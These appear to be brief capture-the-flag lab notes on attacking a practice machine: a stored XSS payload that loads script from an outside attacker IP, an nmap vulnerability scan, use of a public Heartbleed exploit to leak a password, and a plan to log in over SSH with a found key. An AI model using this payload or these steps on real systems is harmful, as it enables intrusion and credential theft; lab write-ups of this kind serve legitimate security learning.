we tried to do a stored xss attack with 
```
"><script src=http://10.10.16.9></script>
```
![[Pasted image 20211215204959.png]]
and we get a hit!
we couldn't do much with what we found but we ran 
nmap --script vuln and we got something interesting
a  exploit on ssl called heart bleed
![[Pasted image 20211215223036.png]]
running heartbleed we leaked some interesting info 
looks like someone is typing a base64 string into /decode 
https://www.exploit-db.com/exploits/32745 #heartbleed 
![[Pasted image 20211215225404.png]] it looks like a password
heartbleedbelievethehype
now let's try to ssh with the key we found earlier and the password we found now and i assume the username will be hype because the key was called hype.key
